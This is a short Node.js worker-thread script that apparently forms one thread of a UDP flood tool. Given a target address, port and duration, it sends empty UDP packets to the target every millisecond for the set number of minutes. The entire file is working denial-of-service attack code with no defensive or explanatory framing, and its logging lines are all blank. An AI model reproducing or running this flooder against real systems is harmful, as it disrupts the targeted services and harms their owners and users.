const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log(``)
          clearInterval(task);
          console.log(``)
          return;
        }
        console.log(``)
      });

    }, 1)
  }, 3000)

  setTimeout(() => {
    clearInterval(task);
    console.log(``)
  }, 1000 * 60 * time);

  console.log(``)
});
